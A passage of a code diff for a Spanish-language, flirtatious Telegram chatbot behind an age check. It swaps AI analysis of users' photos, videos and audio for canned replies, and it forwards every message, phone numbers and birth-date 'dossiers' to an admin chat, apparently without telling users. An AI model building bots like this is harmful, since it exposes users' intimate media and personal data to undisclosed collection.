+        await update.message.reply_text(
+            "¡Hola de nuevo! 😘 Envíame foto, video, audio o escríbeme."
+        )
+
+
+async def telefono_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
+    teclado = ReplyKeyboardMarkup(
+        [[KeyboardButton("📱 Compartir mi número", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True,
+    )
+    await update.message.reply_text(
+        "Si quieres compartir tu número de contacto, toca el botón de abajo:",
+        reply_markup=teclado,
+    )
+
+
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.message.contact or not update.effective_user:
+        return
+    user = update.effective_user
+    telefono = update.message.contact.phone_number
+    guardar_telefono_usuario(user.id, telefono)
+    registrar_actividad(user.id)
+    guardar_mensaje_historial(user.id, "user", f"[Compartió contacto: {telefono}]")
+    await context.bot.send_message(
+        chat_id=DANI_CHAT_ID,
+        text=(
+            "📱 **TELÉFONO COMPARTIDO VOLUNTARIAMENTE**\n"
+            f"👤 **De:** {user.first_name} (`{user.id}`)\n"
+            f"📞 **Número:** `{telefono}`"
+        ),
+    )
+    await update.message.reply_text("¡Gracias por compartirlo! 😘 Seguimos charlando.")
 
 
 async def reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -425,8 +694,8 @@ async def reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
     user_id = update.effective_user.id
     borrar_todo(user_id)
-    actualizar_tiempo(user_id)
-    await update.message.reply_text("🧹 Memoria borrada. Empezamos de cero 😉")
+    registrar_actividad(user_id)
+    await update.message.reply_text("🧹 Conversación y memoria reiniciadas 😉")
 
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -436,74 +705,47 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     if not await verificar_sesion_activa(update, context, user_id):
         return
 
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    await update.message.chat.send_action(action="typing")
-    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
+    registrar_actividad(user_id)
+    await reenviar_al_admin(update, context, tipo_evento="FOTO")
 
-    try:
-        photo_file = await update.message.photo[-1].get_file()
-        photo_bytes = await photo_file.download_as_bytearray()
-        caption = (update.message.caption or "").strip()
-        extraer_y_guardar_nombre(user_id, caption)
-        prompt = caption or "Analiza esta foto: luz, encuadre o pose, cómo mejorarla y una idea para conectar o monetizar."
-        analisis = await responder_con_gemini(user_id, prompt, imagen_bytes=photo_bytes)
-        await msg.delete()
-        await enviar_por_trozos(update, analisis)
-    except Exception as exc:
-        logger.exception("Error analizando foto con Gemini: %s", exc)
-        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien ahora mismo.")
+    usuario_db = obtener_usuario(user_id)
+    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
+    caption = (update.message.caption or "").strip()
+    if caption:
+        nuevo = extraer_y_guardar_nombre(user_id, caption)
+        if nuevo:
+            nombre_memoria = nuevo
+
+    respuesta = elegir_respuesta("foto", nombre_memoria)
+    guardar_mensaje_historial(user_id, "user", f"[Foto] {caption}".strip())
+    guardar_mensaje_historial(user_id, "model", respuesta)
+    await enviar_por_trozos(update, respuesta)
 
 
-async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def handle_video_or_gif(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+) -> None:
     if not update.message or not update.effective_user:
         return
     user_id = update.effective_user.id
     if not await verificar_sesion_activa(update, context, user_id):
         return
 
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    await update.message.chat.send_action(action="typing")
-    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
+    registrar_actividad(user_id)
+    await reenviar_al_admin(update, context, tipo_evento="VIDEO/GIF")
 
-    try:
-        caption = (update.message.caption or "").strip()
-        extraer_y_guardar_nombre(user_id, caption)
-        prompt = caption or "Analiza este video o GIF: movimiento, luz, encuadre, cómo mejorarlo y una idea para monetizar o conectar."
+    usuario_db = obtener_usuario(user_id)
+    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
+    caption = (update.message.caption or "").strip()
+    if caption:
+        nuevo = extraer_y_guardar_nombre(user_id, caption)
+        if nuevo:
+            nombre_memoria = nuevo
 
-        media_obj = update.message.video or update.message.video_note or update.message.animation
-        file_size = getattr(media_obj, "file_size", 0) or 0
-
-        if media_obj and file_size <= 15 * 1024 * 1024:
-            media_file = await media_obj.get_file()
-            media_bytes = await media_file.download_as_bytearray()
-            mime_type = getattr(media_obj, "mime_type", None) or "video/mp4"
-            analisis = await responder_con_gemini(
-                user_id,
-                prompt,
-                video_bytes=media_bytes,
-                video_mime=mime_type,
-            )
-        elif media_obj and getattr(media_obj, "thumbnail", None):
-            thumb_file = await media_obj.thumbnail.get_file()
-            thumb_bytes = await thumb_file.download_as_bytearray()
-            analisis = await responder_con_gemini(
-                user_id,
-                f"{prompt} (El archivo era grande, analiza este fotograma de referencia).",
-                imagen_bytes=thumb_bytes,
-            )
-        else:
-            analisis = await responder_con_gemini(
-                user_id,
-                f"{prompt} (El usuario envió un video/GIF sin vista previa descargable).",
-            )
-
-        await msg.delete()
-        await enviar_por_trozos(update, analisis)
-    except Exception as exc:
-        logger.exception("Error analizando video/GIF con Gemini: %s", exc)
-        await msg.edit_text("🎬 Recibí tu video/GIF, pero tuve un problema al analizarlo.")
+    respuesta = elegir_respuesta("video", nombre_memoria)
+    guardar_mensaje_historial(user_id, "user", f"[Video/GIF] {caption}".strip())
+    guardar_mensaje_historial(user_id, "model", respuesta)
+    await enviar_por_trozos(update, respuesta)
 
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -513,34 +755,26 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     if not await verificar_sesion_activa(update, context, user_id):
         return
 
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    await update.message.chat.send_action(action="typing")
-    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
+    registrar_actividad(user_id)
+    await reenviar_al_admin(update, context, tipo_evento="AUDIO")
 
-    try:
-        audio_obj = update.message.voice or update.message.audio
-        audio_file = await audio_obj.get_file()
-        audio_bytes = await audio_file.download_as_bytearray()
-        mime_type = getattr(audio_obj, "mime_type", None) or "audio/ogg"
-        caption = (update.message.caption or "").strip()
-        extraer_y_guardar_nombre(user_id, caption)
-        prompt = caption or "Escucha este audio: comenta el tono de voz, cómo mejorarlo y una idea de contenido o monetización."
+    usuario_db = obtener_usuario(user_id)
+    nombre_memoria = usuario_db["memoria_nombre"] if usuario_db else None
+    caption = (update.message.caption or "").strip()
+    if caption:
+        nuevo = extraer_y_guardar_nombre(user_id, caption)
+        if nuevo:
+            nombre_memoria = nuevo
 
-        analisis = await responder_con_gemini(
-            user_id,
-            prompt,
-            audio_bytes=audio_bytes,
-            audio_mime=mime_type,
-        )
-        await msg.delete()
-        await enviar_por_trozos(update, analisis)
-    except Exception as exc:
-        logger.exception("Error analizando audio con Gemini: %s", exc)
-        await msg.edit_text("🎧 Escuché tu audio, pero no pude procesarlo bien.")
+    respuesta = elegir_respuesta("audio", nombre_memoria)
+    guardar_mensaje_historial(user_id, "user", f"[Audio] {caption}".strip())
+    guardar_mensaje_historial(user_id, "model", respuesta)
+    await enviar_por_trozos(update, respuesta)
 
 
-async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def check_age_or_chat(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+) -> None:
     if not update.message or not update.message.text or not update.effective_user:
         return
 
@@ -554,17 +788,26 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         if not await verificar_sesion_activa(update, context, user.id):
             return
 
-        actualizar_tiempo(user.id)
-        await reenviar_al_admin(update, context)
-        await update.message.chat.send_action(action="typing")
-        extraer_y_guardar_nombre(user.id, text)
+        registrar_actividad(user.id)
+        nombre_detectado = extraer_y_guardar_nombre(user.id, text)
+        await reenviar_al_admin(update, context, tipo_evento="TEXTO")
 
-        try:
-            respuesta = await responder_con_gemini(user.id, text)
-        except Exception as exc:
-            logger.exception("Error en Gemini: %s", exc)
-            respuesta = "Ups, tuve un problema conectando con Gemini ahora mismo. ¿Me repites? 😉"
+        usuario_actualizado = obtener_usuario(user.id)
+        nombre_memoria = (
+            usuario_actualizado["memoria_nombre"] if usuario_actualizado else None
+        )
 
+        if nombre_detectado:
+            respuesta = (
+                f"¡Mucho gusto, {nombre_detectado}! 😘 Ya me quedó grabado tu nombre. "
+                "Seguimos charlando: ¿qué quieres trabajar hoy o qué me cuentas?"
+            )
+        else:
+            categoria = detectar_categoria(text)
+            respuesta = elegir_respuesta(categoria, nombre_memoria)
+
+        guardar_mensaje_historial(user_id=user.id, rol="user", mensaje=text)
+        guardar_mensaje_historial(user_id=user.id, rol="model", mensaje=respuesta)
         await enviar_por_trozos(update, respuesta)
         return
 
@@ -581,13 +824,16 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             await update.message.reply_text("Debes ser mayor de 18 años.")
             return
 
-        guardar_usuario(user.id, user.first_name, user.username, edad)
+        guardar_usuario(user, edad, text)
+        guardar_mensaje_historial(user.id, "user", f"[Fecha de nacimiento: {text}]")
         await update.message.reply_text(
-            f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios."
+            f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos, audios o escríbeme."
         )
         await enviar_expediente_completo(context, user, text, edad)
     except ValueError:
-        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")
+        await update.message.reply_text(
+            "No entendí la fecha. Envíamela así: DD-MM-AAAA"
+        )
 
 
 # ======================
@@ -598,6 +844,8 @@ if __name__ == "__main__":
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("reset", reset_cmd))
+    application.add_handler(CommandHandler("telefono", telefono_cmd))
+    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(
         MessageHandler(
